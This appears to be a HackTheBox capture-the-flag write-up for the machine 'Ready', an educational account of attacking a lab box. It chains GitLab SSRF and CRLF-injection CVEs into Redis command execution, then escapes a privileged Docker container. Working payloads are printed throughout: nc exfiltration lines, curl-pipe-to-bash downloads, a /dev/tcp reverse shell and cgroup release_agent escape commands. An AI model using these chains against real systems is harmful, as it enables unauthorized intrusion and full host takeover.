---
title: HTB: Ready
url: https://0xdf.gitlab.io/2021/05/15/htb-ready.html
date: 2021-05-15T13:45:00+00:00
difficulty: Medium [30]
os: Linux
tags: ctf, htb-ready, hackthebox, nmap, ubuntu, gitlab, cve-2018-19571, ssrf, cve-2018-19585, crlf-injection, burp, redis, docker, container, escape, docker-privileged, cgroups, oscp-like-v2
---

![Ready](https://0xdfimages.gitlab.io/img/ready-cover.png)

Ready was another opportunity to abuse CVEs in GitLab to get a foothold in a GitLab container. Within that container, I’ll find some creds that will escalate to root. I’ll also notice that the container is run with the privileged flag, which gives it a lot of power with respect to the host system. I’ll show two ways to abuse this, using cgroups and just accessing the host filesystem.

## Box Info

| Name | [Ready](https://hackthebox.com/machines/ready)  [Ready](https://hackthebox.com/machines/ready) [Play on HackTheBox](https://hackthebox.com/machines/ready) |
| --- | --- |
| Release Date | [12 Dec 2020](https://twitter.com/hackthebox_eu/status/1336658280781930496) |
| Retire Date | 15 May 2021 |
| OS | Linux Linux |
| Base Points | Medium [30] |
| Rated Difficulty | Rated difficulty for Ready |
| Radar Graph | Radar chart for Ready |
| First Blood User | 00:12:13[TheCyberGeek TheCyberGeek](https://app.hackthebox.com/users/114053) |
| First Blood Root | 00:37:04[TheCyberGeek TheCyberGeek](https://app.hackthebox.com/users/114053) |
| Creator | [bertolis bertolis](https://app.hackthebox.com/users/27897) |

## Recon

### nmap

`nmap` found two open TCP ports, SSH (22) and HTTP (5080):

```

oxdf@parrot$ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.220
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-09 20:44 EDT
Warning: 10.10.10.220 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.10.220
Host is up (0.021s latency).
Not shown: 59697 closed ports, 5836 filtered ports
PORT     STATE SERVICE
22/tcp   open  ssh
5080/tcp open  onscreen

Nmap done: 1 IP address (1 host up) scanned in 33.18 seconds
oxdf@parrot$ nmap -p 22,5080 -sCV -oA scans/nmap-tcpscripts 10.10.10.220
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-09 20:45 EDT
Nmap scan report for 10.10.10.220
Host is up (0.055s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
5080/tcp open  http    nginx
| http-robots.txt: 53 disallowed entries (15 shown)
| / /autocomplete/users /search /api /admin /profile 
| /dashboard /projects/new /groups/new /groups/*/edit /users /help 
|_/s/ /snippets/new /snippets/*/edit
| http-title: Sign in \xC2\xB7 GitLab
|_Requested resource was http://10.10.10.220:5080/users/sign_in
|_http-trane-info: Problem with XML parsing of /evox/about
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.18 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) version, the host is likely running Ubuntu Focal 20.04.

Based on the `nmap` script results, oprt 5080 seems to be running an instance of GitLab over HTTP.

### Website - TCP 5080

The site is, in fact, GitLab:

![image-20210409204842522](https://0xdfimages.gitlab.io/img/image-20210409204842522.png)

The “Explore” link at the bottom will show any public repos, groups, or snips, but there are none. The help page is the generic help, with nothing interesting.

I’ll register for an account, and nothing changes, except the Help page now has a version and a warning:

[![image-20210409205845167](https://0xdfimages.gitlab.io/img/image-20210409205845167.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20210409205845167.png)

There’s now a version and a warning to update ASAP.

## Shell as git [Container]

### Exploit Details

Seeing as this version is out of date, some Googling turned up a good number of POCs for a vulnerability in this version. There’s actually two vulnerabilities, a Server-Side Request Forgery (SSRF) vulnerability (CVE-2018-19571) and a Carriage-Return Line-Feed (CRLF) Injection vulnerability (CVE-2018-19585).

### CVE-2018-19571 SSRF

A SSRF vulnerability is where an attacker can trick the server into making request on their behalf. In this case, the vulnerability is on the New Project –> Import Project page:

![image-20210409212513842](https://0xdfimages.gitlab.io/img/image-20210409212513842.png)

When I select “Repo by URL”, I’m given the chance to input a URL, and the server will make a GET request to that URL. I’ll open `nc` on port 80 and give it `http://10.10.4.8` as the URL. The website shows an import in progress that just hangs. At my VM, a request arrives:

```

oxdf@parrot$ nc -lnvp 80
listening on [any] 80 ...
connect to [10.10.14.8] from (UNKNOWN) [10.10.10.220] 42356
GET /info/refs?service=git-upload-pack HTTP/1.1
Host: 10.10.14.8
User-Agent: git/2.18.1
Accept: */*
Accept-Encoding: deflate, gzip
Pragma: no-cache

```

To exploit this as an SSRF, I’ll use this to send a request from Ready. But with all of that HTTP header, I basically can only send a GET request. In the past, I’ve played with things like [Gopher](/tags.html#gopher) to get better control over what I send in an SSRF, but GitLab only accepts `http://`, `https://`, and `git://` as protocols in the import url.

`git://` is interesting. I need to give it something that ends in `.git`, like `git://10.10.14.8:80/test/.git`. With `nc` listening, I create that project:

```

oxdf@parrot$ nc -lnvp 80
listening on [any] 80 ...
connect to [10.10.14.8] from (UNKNOWN) [10.10.14.8] 41976
003dgit-upload-pack /test/.githost=10.10.14.8:80version=2

```

That’s only one line, much cleaner.

Still, this isn’t a big deal to just access URLs on the internet, unless I can access something that the system owner doesn’t think I can access, like services on the local GitLab server. The issue for this CVE is that while GitLab blocks connections to 127.0.0.1, it doesn’t block connections to `http://[0:0:0:0:0:ffff:127.0.0.1]`, which is an IPv6 address for localhost.

I’ll test this. GitLab has a Redis server listening on localhost only on TCP 6379. If I try to import from `http://127.0.0.1:6379`, it complains:

![image-20210409213625095](https://0xdfimages.gitlab.io/img/image-20210409213625095.png)

I’ll change that URL to `http://[0:0:0:0:0:ffff:127.0.0.1]:6379`:

![image-20210409213719370](https://0xdfimages.gitlab.io/img/image-20210409213719370.png)

This import will just fail eventually, as Redis doesn’t provide a Git repo that the import is expecting.

### CVE-2018-19585 - CRLF Injection

This vulnerability allows me to put newlines into the url, which results in the connection to something like Redis to be a connection followed by a series of independent commands. I’ll look at this again with `nc`. I’ll import the url `git://10.10.14.8:80/test/.git` again, but this time I’ll intercept the request in Burp Proxy.

[![image-20210409215911004](https://0xdfimages.gitlab.io/img/image-20210409215911004.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20210409215911004.png)

I’ll edit the request to add lines in the middle of the url:

[![image-20210409215956169](https://0xdfimages.gitlab.io/img/image-20210409215956169.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20210409215956169.png)

I’ll send that, and at `nc` I see the result:

```

oxdf@parrot$ nc -lnvp 80
listening on [any] 80 ...
connect to [10.10.14.8] from (UNKNOWN) [10.10.10.220] 43128
0049git-upload-pack /test 
line1 
line2 
line3 
/.githost=10.10.14.8:80

```

If I sent this request to Redis, the first line would error, but then lines 1-3 could be good commands that I want to execute.

### Combining It All

#### POC

[This HackerOne report](https://hackerone.com/reports/299473) shows how to use GitLab Redis to get command execution by sending these commands:

```

 multi
 sadd resque:gitlab:queues system_hook_push
 lpush resque:gitlab:queue:system_hook_push "{\"class\":\"GitlabShellWorker\",\"args\":[\"class_eval\",\"open(\'|whoami | nc 192.241.233.143 80\').read\"],\"retry\":3,\"queue\":\"system_hook_push\",\"jid\":\"ad52abc5641173e217eb2e52\",\"created_at\":1513714403.8122594,\"enqueued_at\":1513714403.8129568}"
 exec

```

To put this all together, I’ll delete my project and start a new import with the URL `git://[0:0:0:0:0:ffff:127.0.0.1]:6379/test/.git`, and intercept it in Burp. I’ll add in the additional Redis commands, making sure to start each line with a space, and modifying his payload to send the results of `whoami` back to my IP:

[![image-20210409220719648](https://0xdfimages.gitlab.io/img/image-20210409220719648.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20210409220719648.png)

This POC is going to run `whoami` and pipe that into `nc` back to my IP. On sending that request, I get a connection with a single word:

```

oxdf@parrot$ nc -lnvp 80
listening on [any] 80 ...
connect to [10.10.14.8] from (UNKNOWN) [10.10.10.220] 43438
git

```

#### Shell

I had to play with payload a bit to get a reverse shell that worked. I tried a handful of things that didn’t work, but eventually went back to an old standby of using `curl` to get a Bash script from my VM and pipe it into `bash`. `shell.sh` was:

```

#!/bin/bash

bash >& /dev/tcp/10.10.14.8/443 0>&1

```

Then the payload was:

```

 multi
 sadd resque:gitlab:queues system_hook_push
 lpush resque:gitlab:queue:system_hook_push "{\"class\":\"GitlabShellWorker\",\"args\":[\"class_eval\",\"open(\'|curl http://10.10.14.8/shell.sh|bash\').read\"],\"retry\":3,\"queue\":\"system_hook_push\",\"jid\":\"ad52abc5641173e217eb2e52\",\"created_at\":1513714403.8122594,\"enqueued_at\":1513714403.8129568}"
 exec

```

On creating that project, I get a shell:

```

oxdf@parrot$ nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.8] from (UNKNOWN) [10.10.10.220] 59190
id   
uid=998(git) gid=998(git) groups=998(git)

```

I’ll upgrade my shell with the standard tricks:

```

python3 -c 'import pty;pty.spawn("bash")'
git@gitlab:~/gitlab-rails/working$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@parrot$ stty raw -echo; fg
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
git@gitlab:~/gitlab-rails/working$ 

```

I’ll also find the user flag in `/home/dude`:

```

git@gitlab:/home/dude$ cat user.txt
e1e30b05************************

```

### Automated Alternative

There’s a bunch of POCs out there that will do that exploit chain for you. [This one](https://github.com/ctrlsam/GitLab-11.4.7-RCE) worked well. I’ll download the Python script, and run it giving my username and password, the url for the repo (it appends the port 5080 for me), and the local IP and port to catch the shell on:

```

oxdf@parrot$ python3 gitlab-sploit.py -u 0xdf -p 0xdf0xdf -g http://10.10.10.220 -l 10.10.14.8 -P 443
[+] authenticity_token: mxr9+YkkIkgYiVSMluglB4tReW05mHUtDj8zz279uDJfOn+KaX3qo9H7lA2iAQbdBTAj89wavowpUxm2SEA7QQ==
[+] Creating project with random name: project7726
[+] Running Exploit
[+] Exploit completed successfully!

```

It works and I get a shell:

```

oxdf@parrot$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.8] from (UNKNOWN) [10.10.10.220] 56004
id
uid=998(git) gid=998(git) groups=998(git)

```

## Shell as root [Container]

### Enumeration

#### Docker

There’s a few indications that I’m in a Docker container. For one, there’s very few commands on this host. `ifconfig` and `ip` are both not present. There’s also a `.dockerenv` file in the system root.

#### Interesting Files

There’s nothing interesting beyond the flag in `/home/dude`. Looking around, there’s a couple things in the `/opt` directory:

```

git@gitlab:/opt$ ls
backup  gitlab

```

`gitlab` is the GitLab code, but `backup` is interesting. It has three files:

```

git@gitlab:/opt/backup$ ls
docker-compose.yml  gitlab-secrets.json  gitlab.rb

```

`gitlab-secrets.json` has keys and stuff related to GitLab, but nothing that’s of use to me. `docker-compose.yml` is interesting, and will be useful later.

`gitlab.rb` is a config file, where the vast majority of the lines start with a comment, `#`. I’ll use `grep` to remove those lines, and then select lines that aren’t blank. There’s only one:

```

git@gitlab:/opt/backup$ cat gitlab.rb | grep -v "^#" | grep .
gitlab_rails['smtp_password'] = "wW59U!ZKMbG9+*#h"

```

### Shell via su

That password is the root password in the container:

```

git@gitlab:/opt/backup$ su -
Password: 
root@gitlab:~#

```

## Shell as root [host]

### Enumeration

The `docker-compose.yml` file defines the container that I’m currently root in:

```

version: '2.4'

services:
  web:
    image: 'gitlab/gitlab-ce:11.4.7-ce.0'
    restart: always
    hostname: 'gitlab.example.com'
    environment:
      GITLAB_OMNIBUS_CONFIG: |
        external_url 'http://172.19.0.2'
        redis['bind']='127.0.0.1'
        redis['port']=6379
        gitlab_rails['initial_root_password']=File.read('/root_pass')
    networks:
      gitlab:
        ipv4_address: 172.19.0.2
    ports:
      - '5080:80'
      #- '127.0.0.1:5080:80'
      #- '127.0.0.1:50443:443'
      #- '127.0.0.1:5022:22'
    volumes:
      - './srv/gitlab/config:/etc/gitlab'
      - './srv/gitlab/logs:/var/log/gitlab'
      - './srv/gitlab/data:/var/opt/gitlab'
      - './root_pass:/root_pass'
    privileged: true
    restart: unless-stopped
    #mem_limit: 1024m

networks:
  gitlab:
    driver: bridge
    ipam:
      config:
        - subnet: 172.19.0.0/16

```

`privileged: true` is a line that’s important. This means that the container has root privileges on the host, and that I can escape.

### cgroups Escape

[This post](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/) has a nice POC that works to execute a command on the host from a privileged container. It runs `ps`, but I’ll modify that to run the same reverse shell from earlier:

```

root@gitlab:~# d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
root@gitlab:~# mkdir -p $d/w;echo 1 >$d/w/notify_on_release
root@gitlab:~# t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
root@gitlab:~# echo $t/c >$d/release_agent;printf '#!/bin/sh\ncurl 10.10.14.8/shell.sh | bash' >/c;
root@gitlab:~# chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";

```

Those commands may look like complete nonsense on first glance. I created a [follow-on post](/2021/05/17/digging-into-cgroups.html) digging into this.

On running the last command, I get a request for `shell.sh` at my Python webserver, and then a shell at a listening `nc` on my VM:

```

oxdf@parrot$ nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.8] from (UNKNOWN) [10.10.10.220] 51066
id                                                  
uid=0(root) gid=0(root) groups=0(root)

```

I can upgrade my shell just like above, and access `root.txt`:

```

root@ready:/root# cat root.txt
b7f98681************************

```

### File System Escape

Instead of running commands, I could also mount the host filesystem. `lsblk` shows the devices, and `sda2` looks like the main disk:

```

root@gitlab:/# lsblk
NAME   MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
loop1    7:1    0 71.3M  1 loop 
loop4    7:4    0 31.1M  1 loop 
loop2    7:2    0 55.5M  1 loop 
loop0    7:0    0 55.4M  1 loop 
sda      8:0    0   20G  0 disk 
|-sda2   8:2    0   18G  0 part /var/log/gitlab
|-sda3   8:3    0    2G  0 part [SWAP]
`-sda1   8:1    0    1M  0 part 
loop5    7:5    0 31.1M  1 loop 
loop3    7:3    0 71.4M  1 loop 

```

I’ll mount it, and now have access to the host filesystem:

```

root@gitlab:/# mount /dev/sda2 /mnt 
root@gitlab:/# ls /mnt/
bin  boot  cdrom  dev  etc  home  lib  lib32  lib64  libx32  lost+found  media  mnt  opt  proc  root  run  sbin  snap  srv  sys  tmp  usr  var

```

I can get the flag:

```

root@gitlab:/# cat /mnt/root/root.txt
b7f98681************************

```

There’s also an SSH key already there, or I could write my own into the `authorized_keys` file.

[Digging into cgroups »](/2021/05/17/digging-into-cgroups.html)